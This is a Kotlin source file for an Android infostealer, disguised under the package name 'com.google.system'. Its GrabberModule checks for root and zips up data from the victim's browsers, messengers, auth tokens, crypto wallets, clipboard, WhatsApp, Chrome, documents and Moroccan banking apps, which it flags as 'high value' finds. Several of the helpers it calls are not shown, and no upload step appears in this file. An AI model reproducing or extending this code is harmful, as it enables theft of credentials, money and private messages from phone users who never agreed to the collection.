package com.google.system

import com.google.system.*
import android.content.Context
import java.io.File
import java.io.FileOutputStream
import java.util.zip.ZipOutputStream

object GrabberModule {

    fun grabAll(ctx: Context) = grab(ctx, "all", deep = true)
    fun grabBrowser(ctx: Context) = grab(ctx, "browser", deep = true)
    fun grabMessenger(ctx: Context) = grab(ctx, "messenger", deep = true)
    fun grabTokens(ctx: Context) = grab(ctx, "tokens", deep = true)
    fun grabWallets(ctx: Context) = grab(ctx, "wallets", deep = true)
    fun grabFiles(ctx: Context) = grab(ctx, "files", deep = true)
    fun grabClipboard(ctx: Context) = grab(ctx, "clipboard", deep = false)
    fun grabBanks(ctx: Context) = grab(ctx, "banks", deep = true)
    fun grabWhatsApp(ctx: Context) = grab(ctx, "whatsapp", deep = true)
    fun grabChrome(ctx: Context) = grab(ctx, "chrome", deep = true)
    fun grabDocs(ctx: Context) = grab(ctx, "docs", deep = true)

    fun grab(ctx: Context, target: String, deep: Boolean = false): GrabResult {
        val installed = ctx.packageManager.getInstalledPackages(0).map { it.packageName }.toSet()
        val hasRoot = checkRoot()
        val r = GrabResult(hasRoot = hasRoot, installedCount = installed.size)
        val zipFile = File(ctx.cacheDir, "grab_${target}_${System.currentTimeMillis()}.zip")
        try {
            ZipOutputStream(FileOutputStream(zipFile)).use { zos ->
                val report = GrabReport()
                when (target) {
                    "all" -> {
                        deepScanApps(ctx, installed, hasRoot, zos, r)
                        deepScanStorage(ctx, zos, r)
                        deepScanContentProviders(ctx, zos, r)
                        deepScanLogs(ctx, zos, r)
                        deepScanBackups(ctx, zos, r)
                        deepScanBanks(ctx, installed, hasRoot, zos, r)
                        extractWhatsAppAll(ctx, hasRoot, zos, r)
                        extractChromeAll(ctx, hasRoot, zos, r, report)
                        scanClipboard(ctx, zos, r)
                    }
                    "browser" -> deepScanBrowsers(ctx, installed, hasRoot, zos, r)
                    "messenger" -> deepScanMessengers(ctx, installed, hasRoot, zos, r)
                    "tokens" -> deepScanTokens(ctx, installed, hasRoot, zos, r)
                    "wallets" -> deepScanWallets(ctx, installed, hasRoot, zos, r)
                    "files" -> deepScanStorage(ctx, zos, r)
                    "clipboard" -> scanClipboard(ctx, zos, r)
                    "banks" -> deepScanBanks(ctx, installed, hasRoot, zos, r)
                    "whatsapp" -> extractWhatsAppAll(ctx, hasRoot, zos, r)
                    "chrome" -> extractChromeAll(ctx, hasRoot, zos, r, report)
                    "docs" -> deepScanDocuments(ctx, zos, r)
                    else -> {
                        deepScanApps(ctx, installed, hasRoot, zos, r)
                        deepScanStorage(ctx, zos, r)
                        deepScanContentProviders(ctx, zos, r)
                        deepScanBanks(ctx, installed, hasRoot, zos, r)
                        scanClipboard(ctx, zos, r)
                    }
                }
                report.files = r.files
                report.size = r.size
                report.highValue = r.highValue
                r.report = report.build()
            }
            if (zipFile.exists() && zipFile.length() > 0) {
                r.file = zipFile
                r.size = zipFile.length()
            } else {
                zipFile.delete()
            }
        } catch (e: Exception) {
            r.error = e.message
            zipFile.delete()
        }
        return r
    }

    private fun deepScanApps(ctx: Context, installed: Set<String>, hasRoot: Boolean, zos: ZipOutputStream, r: GrabResult) {
        deepScanBrowsers(ctx, installed, hasRoot, zos, r)
        deepScanMessengers(ctx, installed, hasRoot, zos, r)
        deepScanTokens(ctx, installed, hasRoot, zos, r)
        deepScanWallets(ctx, installed, hasRoot, zos, r)
    }
    private fun deepScanBrowsers(ctx: Context, installed: Set<String>, hasRoot: Boolean, zos: ZipOutputStream, r: GrabResult) {
        for ((pkg, name) in BROWSERS) {
            if (!installed.contains(pkg)) continue
            scanAppDataDir(pkg, name, "browser", zos, r, hasRoot)
            scanExternalAppData(ctx, pkg, name, "browser", zos, r)
        }
    }
    private fun deepScanMessengers(ctx: Context, installed: Set<String>, hasRoot: Boolean, zos: ZipOutputStream, r: GrabResult) {
        for ((pkg, name) in HIGH_VALUE_APPS) {
            if (BROWSERS.containsKey(pkg)) continue
            if (!installed.contains(pkg)) continue
            scanAppDataDir(pkg, name, "messenger", zos, r, hasRoot)
            scanExternalAppData(ctx, pkg, name, "messenger", zos, r)
        }
    }
    private fun deepScanTokens(ctx: Context, installed: Set<String>, hasRoot: Boolean, zos: ZipOutputStream, r: GrabResult) {
        for ((pkg, name) in HIGH_VALUE_APPS) {
            if (BROWSERS.containsKey(pkg) || isWallet(pkg)) continue
            if (!installed.contains(pkg)) continue
            scanAppDataDir(pkg, name, "tokens", zos, r, hasRoot)
            scanExternalAppData(ctx, pkg, name, "tokens", zos, r)
        }
    }
    private fun deepScanWallets(ctx: Context, installed: Set<String>, hasRoot: Boolean, zos: ZipOutputStream, r: GrabResult) {
        for ((pkg, name) in HIGH_VALUE_APPS) {
            if (!isWallet(pkg)) continue
            if (!installed.contains(pkg)) continue
            scanAppDataDir(pkg, name, "wallets", zos, r, hasRoot)
            scanExternalAppData(ctx, pkg, name, "wallets", zos, r)
        }
    }
    private fun deepScanBanks(ctx: Context, installed: Set<String>, hasRoot: Boolean, zos: ZipOutputStream, r: GrabResult) {
        for ((pkg, name) in BANKS_MOROCCO) {
            if (!installed.contains(pkg)) continue
            scanAppDataDir(pkg, name, "banks", zos, r, hasRoot)
            scanExternalAppData(ctx, pkg, name, "banks", zos, r)
            r.banksFound++
        }
    }


}